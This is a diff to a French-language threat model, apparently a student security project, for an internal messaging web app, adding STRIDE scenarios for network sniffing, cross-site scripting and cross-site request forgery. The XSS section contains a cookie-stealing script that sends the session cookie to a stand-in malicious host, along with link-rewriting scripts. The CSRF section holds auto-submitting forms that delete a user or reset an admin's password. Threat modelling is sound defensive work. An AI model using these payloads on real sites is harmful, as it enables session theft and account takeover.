@@ -168,6 +168,7 @@ Comme l'application Web n'est accessible que depuis le réseau interne de l'entr
   Dans ce scénario, nous pouvons identifier les menaces suivantes :
 
   - Spoofing
+  - Tempering
   - Information disclosure
 
 #### 2. Contourner le système d'autorisation afin d'accéder aux messages des autres employés
@@ -205,7 +206,7 @@ Comme l'application Web n'est accessible que depuis le réseau interne de l'entr
 
 - **Scénario d'attaque** :
   
-  Comme l'application Web utilise HTTP pour échanger les données entre le client et le serveur, il est tout à fait possible de sniffer le réseau afin de récupérer les credentials d'un employé ou récupérer des messages envoyés à un autre employé. Un attaquant pourrait récupérer les credentials d'un administrateur, usurper son identité, accéder aux fonctionnalités supplémentaires (gestion admin). De manière plus active, il pourrait à l'aide d'un proxy d'interception, modifier la requête envoyée au serveur afin de porter atteinte à l'intégrité d'un message envoyé à un autre employé (en modifiant l'expéditeur d'un message par ex.). **A VERIFIER** : Avec ce même proxy, il pourrait également passer Administrateur en modifiant la requête lui permettant de changer son mot de passe.
+  Comme l'application Web utilise HTTP pour échanger les données entre le client et le serveur, il est tout à fait possible de sniffer le réseau afin de récupérer les credentials d'un employé ou récupérer des messages envoyés à un autre employé. Un attaquant pourrait récupérer les credentials d'un administrateur, usurper son identité, accéder aux fonctionnalités supplémentaires (gestion admin). De manière plus active, il pourrait à l'aide d'un proxy d'interception, modifier la requête envoyée au serveur afin de porter atteinte à l'intégrité d'un message envoyé à un autre employé (en modifiant l'expéditeur d'un message par ex.).
   
 - **Contrôles** :
   - Bien que cette contre-mesure ne sera pas mise en place dans le cadre de ce projet, la solution la plus efficace à ce problème de sécurité est de passer le serveur en HTTPS afin que tous les messages échangés soient chiffrés pour ainsi assurer la confidentialité, l'intégrité et l'authenticité.
@@ -218,21 +219,42 @@ Comme l'application Web n'est accessible que depuis le réseau interne de l'entr
   - Tampering
   - Repudiation
   - Information disclosure
-  - Elevation of privilege (**A VERIFIER**)
 
 #### 4. Attaque Cross-Site Scripting
 
-- **Impact sur l'entreprise** :
+- **Impact sur l'entreprise** : élevé (perte de confidentialité, d'intégrité et d'authenticité)
 
-- **Sources de la menace** : 
+- **Sources de la menace** : employé mécontent, malin ou curieux
 
-- **Motivation** : 
+- **Motivation** : sabotage, divulgation d'information, curiosité, usurpation d'identité
 
-- **Actif(s) visé(s)** : 
+- **Actif(s) visé(s)** : compte de l'employé visé 
 
-- **Scénario d'attaque** :
+- **Scénarios d'attaque** :
 
-  
+  - A l'aide d'une balise `<script>` injectée dans le sujet d'un message, un attaquant peut voler le cookie *PHPSESSID* de l'employé cible en lui envoyant ce message. À l'ouverture de sa mailbox, le script sera exécuté et enverra le cookie de l'employé au site malicieux de l'attaquant, il pourra ensuite utiliser ce cookie dans son navigateur afin de lui voler sa session.
+
+    Exemple de script :
+    
+    ```html
+    <script>fetch("http://www.malicious-site.com/steal?cookie=" + document.cookie);</script>
+    ```
+    
+  - Même principe que le scénario précédent mais là, l'attaquant va modifier le DOM de l'employé cible et changer le comportement d'un lien ou d'un bouton pour le rediriger sur un site malicieux.
+
+    Exemple de script :
+
+    ```html
+    <script>var logoutBtn = document.getElementsByTagName("a")[3]; logoutBtn.href = "http://www.malicious-site.com";</script>
+    ```
+
+  - En reprenant le scénario précédent, un attaquant peut également profiter des fonctionnalités accessibles uniquement par un administrateur en modifiant l'action d'un bouton pour que l'employé admin visé effectue une action involontaire en appuyant sur celui-ci.
+
+    Exemple de script :
+
+    ```html
+    <script>var logoutBtn = document.getElementsByTagName("a")[3]; logoutBtn.href = "index.php?action=delete_user&no=24";</script>
+    ```
 
 - **Contrôles** :
 
@@ -244,21 +266,57 @@ Comme l'application Web n'est accessible que depuis le réseau interne de l'entr
 
   Dans ce scénario, nous pouvons identifier les menaces suivantes :
 
+  - Spoofing
+  - Tempering
+  - Information Disclosure
+  - Elevation of privilege
+  
   
 
 #### 5. Attaque Cross-Site Request Forgery
 
-- **Impact sur l'entreprise** :
+- **Impact sur l'entreprise** : élevé (perte de confidentialité, d'intégrité et d'authenticité)
 
-- **Sources de la menace** : 
+- **Sources de la menace** : employé mécontent, malin
 
-- **Motivation** : 
+- **Motivation** : sabotage, divulgation d'information, usurpation d'identité, curiosité
 
-- **Actif(s) visé(s)** : 
+- **Actif(s) visé(s)** : compte d'un autre employé
 
 - **Scénario d'attaque** :
 
-  
+  - Un employé malicieux pourrait envoyer le lien de son site pirate à un administrateur **authentifié** afin qu'il exécute une action involontaire lorsqu'il se connecte à celui-ci (ajouter/supprimer/modifier un utilisateur par ex.).
+
+    Exemple de site malicieux :
+
+    ```js
+    app.get('/', function (req, res) {
+        res.send(`
+        <body onload="document.forms[0].submit()">
+        <form action="http://localhost:8081/index.php?action=delete_user&no=27" method="POST"></form>`);
+    });
+    ```
+
+  - Un employé malicieux pourrait également voler le compte d'un administrateur (ou utilisateur) en le forçant à changer de mot de passe involontairement pour pouvoir ensuite se connecter à son compte avec ce nouveau mot de passe défini.
+
+    Exemple de site malicieux :
+
+    ```js
+    app.get('/', function (req, res) {
+        res.send(`
+        <body onload="document.forms[0].submit()">
+        <form action="http://localhost:8081/index.php?action=update_user&no=1" method="POST">
+            <input type="hidden" name="role" value="1"/>
+            <input type="hidden" name="password" value="Pass1234"/>
+            <input type="hidden" name="confpassword" value="Pass1234"/>
+            <input type="hidden" name="valid" value="on"/>
+        </form>`);
+    });
+    ```
+
+  - Selon le même principe, un attaquant pourrait forcer l'envoi d'un message à un autre employé avec le compte de l'employé visé.
+
+
 
 - **Contrôles** :
 
@@ -269,6 +327,11 @@ Comme l'application Web n'est accessible que depuis le réseau interne de l'entr
 - **STRIDE** :
 
   Dans ce scénario, nous pouvons identifier les menaces suivantes :
+
+  - Spoofing
+  - Tempering
+  - Information disclosure
+  - Elevation of privilege
 
   
 
